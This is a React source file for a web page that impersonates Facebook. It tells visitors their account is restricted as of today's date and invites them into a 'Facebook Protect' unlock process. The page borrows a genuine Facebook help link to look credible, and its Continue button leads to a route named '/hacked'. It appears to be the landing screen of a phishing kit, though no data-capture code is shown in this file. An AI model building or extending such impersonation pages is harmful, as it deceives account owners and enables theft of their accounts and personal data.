import Favicon from '@/assets/images/aGT3gskzWBf.ico';
import HeroImage from '@/assets/images/hero-image-2.png';
import { faAddressCard, faCheck } from '@fortawesome/free-solid-svg-icons';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import React, { useEffect, useState } from 'react';
import { Helmet } from 'react-helmet-async';
import { useNavigate } from 'react-router-dom';

const Home: React.FC = () => {
	const navigate = useNavigate();
	const [today, setToday] = useState<string>('');

	useEffect(() => {
		localStorage.clear();
		const formatDate = (): string => {
			const date = new Date();
			return date.toLocaleDateString('en-US', {
				month: 'long',
				day: 'numeric',
				year: 'numeric',
			});
		};
		setToday(formatDate());
	}, []);

	return (
		<div className='flex min-h-screen flex-col items-center justify-center py-8'>
			<Helmet>
				<title>Business Help Center</title>
				<link rel='shortcut icon' href={Favicon} type='image/x-icon' />
			</Helmet>
			<div className='flex w-11/12 flex-col gap-4 rounded-lg md:w-2/5 2xl:w-1/3'>
				<img src={HeroImage} alt='Hero' className='rounded-t-lg' />
				<b className='text-2xl'>Welcome To Facebook Protect.</b>
				<p>
					Your account's accessibility is limited, so we ask that
					higher security requirements be applied to that account. We
					created this security program to unlock your account. <br />
					<a
						href='https://www.facebook.com/help/582999911881572'
						target='_blank'
						className='text-blue-500 hover:underline'
						rel='noreferrer'
					>
						More information
					</a>
				</p>

				<div className='px-4'>
					<ol className='relative flex flex-col gap-5 border-s-2 border-s-gray-200'>
						<li className='mb-10 ms-6 pb-4'>
							<div className='absolute -start-4 flex items-center justify-start gap-2'>
								<FontAwesomeIcon
									icon={faCheck}
									size='lg'
									className='h-4 w-4 rounded-full bg-gray-400 p-2 text-white ring-2 ring-white'
								/>
								<p>
									We've enabled advanced protections to unlock
									your account.
								</p>
							</div>
						</li>
						<li className='mb-10 ms-6'>
							<div className='absolute -start-4 flex items-center justify-start gap-2'>
								<FontAwesomeIcon
									icon={faAddressCard}
									size='xs'
									className='h-4 w-4 rounded-full bg-blue-500 p-2 text-white ring-2 ring-white'
								/>
								<p>
									Below, we walk you through the process in
									detail and help you fully activate to unlock
									your account.
								</p>
							</div>
						</li>
					</ol>
				</div>
				<div className='mt-6 md:mt-3'>
					<button
						className='w-full rounded-lg bg-blue-500 p-3 font-semibold text-white'
						onClick={() => {
							navigate('/hacked');
						}}
					>
						Continue
					</button>
				</div>
				<p className='text-center'>
					Your account was restricted on <b>{today}</b>
				</p>
			</div>
		</div>
	);
};

export default Home;
